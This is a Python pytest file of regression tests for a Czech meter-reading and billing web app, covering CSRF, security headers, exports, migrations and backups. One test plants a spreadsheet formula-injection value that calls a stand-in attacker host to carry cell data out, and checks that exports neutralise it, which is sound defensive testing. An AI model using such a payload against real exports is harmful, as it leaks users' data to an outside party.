"""Regression tests for issues found in the integration review (finalize phase)."""

from __future__ import annotations

from datetime import date

from sqlalchemy import select
from sqlalchemy.orm import Session

from app.models import Allocation, MeterPoint, Tenant
from tests import synthetic as syn


def _alloc(client, tenant: Tenant, point: MeterPoint, **extra) -> str:
    data = {"tenant_id": str(tenant.id), "meter_point_id": str(point.id), "factor": "1", **extra}
    return client.post("/sprava/alokace", data=data, follow_redirects=True).text


def test_allocation_overlap_is_refused(imported_admin_client, imported_db: Session) -> None:
    """Two allocations of one point at the same time would count its consumption twice."""
    tenant_b = imported_db.scalar(select(Tenant).where(Tenant.name == syn.B))
    tenant_a = imported_db.scalar(select(Tenant).where(Tenant.name == syn.A))
    e_point = imported_db.scalar(select(MeterPoint).where(MeterPoint.name == syn.E_POINT))
    n = imported_db.scalar(select(Allocation).where(Allocation.meter_point_id == e_point.id))
    assert n is not None and n.valid_to is None  # imported: tenant E's point -> tenant E, open-ended

    html = _alloc(imported_admin_client, tenant_b, e_point, valid_from="2026-01-01")
    assert "víc než ze 100" in html
    # the same tenant twice in an overlapping window
    tenant_e = imported_db.get(Tenant, n.tenant_id)
    assert "překrývajícím" in _alloc(imported_admin_client, tenant_e, e_point, valid_from="2025-06-01")

    # moving the point to another tenant: end the old allocation first, then the new one is fine
    r = imported_admin_client.post(
        f"/sprava/alokace/{n.id}",
        data={
            "tenant_id": str(tenant_e.id),
            "meter_point_id": str(e_point.id),
            "factor": "1",
            "valid_to": "2026-01-01",
        },
        follow_redirects=True,
    )
    assert "Uloženo" in r.text
    assert "Alokace přidána" in _alloc(
        imported_admin_client, tenant_b, e_point, valid_from="2026-01-01", valid_to="2027-01-01"
    )
    # shares that add up to 100 % are fine, more is not
    assert "Alokace přidána" in _alloc(imported_admin_client, tenant_a, e_point, factor="0,5", valid_from="2027-01-01")
    assert "víc než ze 100" in _alloc(imported_admin_client, tenant_b, e_point, factor="0,6", valid_from="2027-06-01")
    assert "Alokace přidána" in _alloc(imported_admin_client, tenant_b, e_point, factor="0,5", valid_from="2027-06-01")
    imported_db.expire_all()
    rules = imported_db.scalars(select(Allocation).where(Allocation.meter_point_id == e_point.id)).all()
    assert {(r.valid_from, r.valid_to) for r in rules} >= {
        (None, date(2026, 1, 1)),
        (date(2026, 1, 1), date(2027, 1, 1)),
    }


def test_exports_never_contain_live_formulas(imported_admin_client, imported_db: Session) -> None:
    import io

    import openpyxl

    t = imported_db.scalar(select(Tenant).where(Tenant.name == syn.E))
    t.name = '=HYPERLINK("http://evil.example/?"&A1,"klik")'
    imported_db.commit()
    for url in ("/spotreba/export.xlsx", "/spotreba/export.xlsx?pohled=dny&rok=vse"):
        wb = openpyxl.load_workbook(io.BytesIO(imported_admin_client.get(url).content))
        cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row]
        assert not [c.coordinate for c in cells if c.data_type == "f"], url
        assert any(isinstance(c.value, str) and c.value.startswith("=HYPERLINK") for c in cells), url
    csv = imported_admin_client.get("/spotreba/export.csv").content.decode("utf-8-sig")
    assert "=HYPERLINK" in csv and ";=HYPERLINK" not in csv and "\n=HYPERLINK" not in csv
    # settlement workbook (incl. its own "= <remainder tenant>" label in the remainder breakdown)
    r = imported_admin_client.post("/vyuctovani", data={"year": "2025"}, follow_redirects=False)
    sid = r.headers["location"].rsplit("/", 1)[1]
    wb = openpyxl.load_workbook(io.BytesIO(imported_admin_client.get(f"/vyuctovani/{sid}/export.xlsx").content))
    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row]
    assert not [c.coordinate for c in cells if c.data_type == "f"]
    assert any(c.value == f"= {syn.REMAINDER}" for c in cells)


def test_security_headers_and_fail_closed_config(anon_client) -> None:
    import pytest

    from app.config import DEV_SECRET_KEY, Settings

    r = anon_client.get("/login")
    assert r.headers["x-content-type-options"] == "nosniff" and r.headers["x-frame-options"] == "DENY"
    # forgotten APP_ENV on a real host name must not accept the public dev key or the bypass
    with pytest.raises(ValueError, match="SECRET_KEY"):
        Settings(_env_file=None, base_url="https://odecty.example.org", secret_key=DEV_SECRET_KEY)
    with pytest.raises(ValueError, match="AUTH_DEV_BYPASS"):
        Settings(_env_file=None, base_url="https://odecty.example.org", secret_key="x" * 40, auth_dev_bypass=True)
    assert Settings(_env_file=None, auth_dev_bypass=True).auth_dev_bypass  # localhost development still works
    # the Workspace domain is installation data (.env only): no default, required in production
    assert Settings(_env_file=None).allowed_domain == ""
    with pytest.raises(ValueError, match="ALLOWED_DOMAIN"):
        Settings(_env_file=None, app_env="production", secret_key="x" * 40)
    with pytest.raises(ValueError, match="ALLOWED_DOMAIN"):
        Settings(_env_file=None, base_url="https://odecty.example.org", secret_key="x" * 40)
    ok = Settings(_env_file=None, app_env="production", secret_key="x" * 40, allowed_domain="Example.org")
    assert ok.allowed_domain == "example.org"


def test_csrf_middleware_does_not_buffer_anonymous_uploads(app) -> None:
    from fastapi.testclient import TestClient

    c = TestClient(app)
    c.get("/login")  # anonymous session with a CSRF token
    big = b"x" * (2 * 1024 * 1024)
    r = c.post("/obchuzka/api/foto", files={"photo": ("a.jpg", big, "image/jpeg")})
    assert r.status_code == 403  # rejected without reading the form


# --- seams between capture and reports ---------------------------------------------------------


def _meter(db: Session, serial: str):
    from app.models import Meter

    return db.scalar(select(Meter).where(Meter.serial == serial))


def test_review_replacement_matches_sprava_and_loses_no_kwh(imported_db: Session) -> None:
    from datetime import datetime
    from decimal import Decimal as D

    import pytest

    from app import services as s
    from app.capture.meters import create_meter
    from app.capture.readings import InputError
    from app.models import Reading, User

    user = User(email="admin@example.org", name="A", role="admin", active=True)
    imported_db.add(user)
    imported_db.flush()
    old = _meter(imported_db, syn.E_SERIAL)  # tenant E, last read 3.6.2026
    with pytest.raises(InputError, match="odečet po datu výměny"):
        create_meter(
            imported_db,
            user,
            serial="90000001",
            point_id=old.meter_point_id,
            registers=["T1"],
            installed_on=date(2026, 5, 1),
            replace_meter_id=old.id,
        )
    imported_db.rollback()
    imported_db.add(user)
    imported_db.flush()
    old = _meter(imported_db, syn.E_SERIAL)
    new = create_meter(
        imported_db,
        user,
        serial="90000001",
        point_id=old.meter_point_id,
        registers=["T1"],
        installed_on=date(2026, 6, 20),
        replace_meter_id=old.id,
        initial={"T1": D(0)},
    )
    imported_db.add(
        Reading(meter_id=new.id, register="T1", taken_at=datetime(2026, 7, 1), value=D("12.5"), source="photo")
    )
    imported_db.commit()
    assert old.removed_on == date(2026, 6, 20)
    first = imported_db.scalar(select(Reading).where(Reading.meter_id == new.id).order_by(Reading.taken_at))
    assert (first.taken_at, first.value, first.status) == (datetime(2026, 6, 20), 0, "confirmed")
    table = s.point_consumption_table(imported_db, start=date(2026, 5, 1), end=date(2026, 9, 1))
    vals = table.values[old.meter_point_id]["T1"]
    assert all(v.value >= 0 for v in vals), [v.value for v in vals]
    # the new meter's 12.5 kWh (20.6.-1.7.) are counted, the old one ran until 20.6. (estimated)
    june_july = sum((v.value for v in vals[1:3]), D(0))
    assert june_july > D("12.5")


def test_grid_correction_of_imported_value_survives_reimport(
    imported_admin_client, imported_db: Session, xlsx_path, import_mapping
) -> None:
    from datetime import datetime

    from app.importer import ImportRefusedError, import_workbook
    from app.models import Reading

    m = _meter(imported_db, syn.PARA_SERIAL)
    fixed = int(syn.value("D", "3.6.2026")) + 1
    r = imported_admin_client.post(
        "/odecty/bunka",
        data={
            "meter_id": m.id,
            "register": "T1",
            "den": "2026-06-03",
            "value": str(fixed),
            "action": "save",
            "ack": "high",
        },
    )
    assert r.status_code == 200
    imported_db.expire_all()
    rd = imported_db.scalar(select(Reading).where(Reading.meter_id == m.id, Reading.taken_at == datetime(2026, 6, 3)))
    assert rd.value == fixed and rd.source == "manual"
    import pytest

    with pytest.raises(ImportRefusedError):
        import_workbook(imported_db, xlsx_path, mapping=import_mapping, corrections=False)
    imported_db.rollback()
    report = import_workbook(imported_db, xlsx_path, mapping=import_mapping, force=True, corrections=False)
    imported_db.commit()
    imported_db.expire_all()
    assert report.skipped_readings == 1
    assert imported_db.get(Reading, rd.id).value == fixed


def test_walk_never_demotes_a_confirmed_reading(imported_db: Session) -> None:
    from decimal import Decimal as D

    from app.capture.readings import existing_reading, write_reading

    m = _meter(imported_db, syn.PARA_SERIAL)
    res = write_reading(
        imported_db,
        None,
        meter_id=m.id,
        register="T1",
        day=date(2026, 6, 3),
        value=D(int(syn.value("D", "3.6.2026")) + 50),
        source="manual",
        status="pending",
        overwrite=True,
    )
    assert res.status == "conflict" and "potvrzený" in res.message
    cur = existing_reading(imported_db, m.id, "T1", date(2026, 6, 3))
    assert cur.status == "confirmed" and cur.value == D(syn.value("D", "3.6.2026"))


def test_messages_are_cs_formatted_and_decimal_slip_links_to_settings(imported_db: Session) -> None:
    from decimal import Decimal as D

    from app.capture.plausibility import check_value
    from app.models import Reading

    main = _meter(imported_db, syn.MAIN_SERIAL)
    last = int(syn.last_value("B")[1])
    issues = check_value(imported_db, main, "T1", D(last - 10000), date(2026, 7, 1))
    msg = " ".join(i.message for i in issues)
    assert f"{last:,}".replace(",", "\xa0") + "\xa0kWh" in msg and f"{last}.000" not in msg
    m = _meter(imported_db, syn.CORRIDOR_SERIAL)  # LCD module, imported with decimals_shown = 0
    last = imported_db.scalar(select(Reading.value).where(Reading.meter_id == m.id).order_by(Reading.taken_at.desc()))
    slip = [
        i for i in check_value(imported_db, m, "T1", (last + 30) * 100, date(2026, 7, 1)) if i.code == "decimal_slip"
    ]
    assert slip and slip[0].link == f"/sprava/elektromery/{m.id}" and "ve Správě" in slip[0].message
    assert slip[0].as_dict()["link"] == f"/sprava/elektromery/{m.id}"


def test_short_segment_does_not_raise_spike_alerts(imported_db: Session) -> None:
    from app import services as s

    anomalies = s.meter_anomalies(imported_db)
    assert not [
        a for a in anomalies if a.anomaly.kind == "spike" and a.anomaly.curr.taken_at.date() == date(2026, 6, 3)
    ]


def test_admin_can_set_decimals_and_display_note(imported_admin_client, imported_db: Session) -> None:
    m = _meter(imported_db, syn.CORRIDOR_SERIAL)
    r = imported_admin_client.post(
        f"/sprava/elektromery/{m.id}",
        data={
            "serial": m.serial,
            "reg_T1": "1",
            "digits": "5",
            "decimals_shown": "2",
            "source_type": "manual",
            "display_note": "LCD otočený o 90°, 0012345 = 123,45",
        },
        follow_redirects=True,
    )
    assert r.status_code == 200 and "Uloženo" in r.text
    imported_db.expire_all()
    m = _meter(imported_db, syn.CORRIDOR_SERIAL)
    assert m.decimals_shown == 2 and m.display_note.startswith("LCD")


def test_process_clock_follows_configured_tz(db_url, make_app) -> None:
    import os
    import time

    old = os.environ.get("TZ")
    os.environ["TZ"] = "UTC"
    time.tzset()
    try:
        make_app(db_url, tz="Europe/Prague")  # (TZ in the environment is also the setting itself)
        assert time.tzname[0] in ("CET", "CEST")
    finally:
        if old is None:
            os.environ.pop("TZ", None)
        else:
            os.environ["TZ"] = old
        time.tzset()


# --- migrations at start, backups -----------------------------------------------------------------


def test_migrate_creates_backs_up_and_upgrades(tmp_path) -> None:
    import sqlite3

    from alembic import command
    from app.migrate import alembic_config, migrate, revisions

    url = f"sqlite:///{tmp_path / 'app.db'}"
    assert "prázdná" in migrate(url)  # fresh install: schema created, nothing to back up
    cur, head = revisions(url)
    assert cur == head and "aktuální" in migrate(url)
    assert not (tmp_path / "backups").exists()
    # an older database (like the user's dev DB at 0001) is snapshotted first
    command.downgrade(alembic_config(url), "0001")
    out = migrate(url)
    snaps = list((tmp_path / "backups").glob("pre-migrate-0001-*.db"))
    assert len(snaps) == 1 and "Záloha" in out and revisions(url)[0] == head
    with sqlite3.connect(snaps[0]) as c:
        assert c.execute("select version_num from alembic_version").fetchone()[0] == "0001"


def test_backup_snapshot_is_consistent_while_db_is_written(tmp_path, monkeypatch) -> None:
    import sqlite3
    import tarfile

    from app import backup as b
    from app.config import get_settings

    data = tmp_path / "data"
    (data / "photos" / "2026" / "11").mkdir(parents=True)
    (data / "photos" / "2026" / "11" / "x.jpg").write_bytes(b"jpg")
    live = sqlite3.connect(data / "app.db")
    live.execute("PRAGMA journal_mode=WAL")
    live.execute("create table t (v integer)")
    live.executemany("insert into t values (?)", [(i,) for i in range(1000)])
    live.commit()  # committed, but still in app.db-wal (no checkpoint)
    assert (data / "app.db-wal").stat().st_size > 0
    monkeypatch.setenv("DATA_DIR", str(data))
    get_settings.cache_clear()
    try:
        snap = b.backup(tmp_path / "out")
        with sqlite3.connect(snap) as c:
            assert c.execute("select count(*) from t").fetchone()[0] == 1000
        arch = b.backup(tmp_path / "out", with_photos=True)
        with tarfile.open(arch) as tar:
            assert {"app.db", "photos/2026/11/x.jpg"} <= set(tar.getnames())
    finally:
        live.close()
        get_settings.cache_clear()


# --- every mutating route: anonymous / reader / admin without token are rejected, nothing changes ------


def _routes(app):
    from fastapi.routing import APIRoute

    out = []

    def rec(routes):
        for r in routes:
            if isinstance(r, APIRoute):
                out.append(r)
            elif hasattr(r, "original_router"):
                rec(r.original_router.routes)

    rec(app.routes)
    return out


def _db_digest(app) -> str:
    import hashlib
    import sqlite3

    con = sqlite3.connect(app.state.settings.sqlalchemy_url.removeprefix("sqlite:///"))
    try:
        return hashlib.sha256("\n".join(con.iterdump()).encode()).hexdigest()
    finally:
        con.close()


def test_all_mutating_routes_reject_anonymous_readers_and_missing_csrf(imported_app, login_client) -> None:
    import re

    from fastapi.testclient import TestClient

    from app.routers.obchuzka import CSRF_EXEMPT_PATHS

    reader = login_client(imported_app, "reader")
    admin = login_client(imported_app, "admin")
    anon = TestClient(imported_app)
    token = re.search(r'name="csrf-token" content="([^"]+)"', anon.get("/login").text).group(1)
    mutating = [
        (m, re.sub(r"\{[^}]+\}", "1", r.path.replace("{key}", "p1")))
        for r in _routes(imported_app)
        for m in sorted(r.methods & {"POST", "PUT", "PATCH", "DELETE"})
    ]
    assert len(mutating) >= 30
    before = _db_digest(imported_app)
    problems = []
    for method, path in mutating:
        if path in CSRF_EXEMPT_PATHS:
            continue
        r = anon.request(method, path, data={"x": "1", "csrf_token": token}, follow_redirects=False)
        if not (r.status_code in (401, 403) or (r.status_code == 303 and "/login" in r.headers["location"])):
            problems.append(f"anonymous {method} {path}: {r.status_code}")
        if path != "/logout":
            r = reader.request(method, path, data={"x": "1"}, follow_redirects=False)
            if r.status_code != 403:
                problems.append(f"reader {method} {path}: {r.status_code}")
        tok = admin.headers.pop("X-CSRF-Token")
        try:
            r = admin.request(method, path, data={"x": "1"}, follow_redirects=False)
        finally:
            admin.headers["X-CSRF-Token"] = tok
        if r.status_code != 403:
            problems.append(f"admin without CSRF {method} {path}: {r.status_code}")
    assert problems == []
    assert _db_digest(imported_app) == before
    # the only CSRF-exempt route (OS share sheet) is a non-mutating navigation
    for path in CSRF_EXEMPT_PATHS:
        anon.post(path, data={"x": "1"}, follow_redirects=False)
    assert _db_digest(imported_app) == before
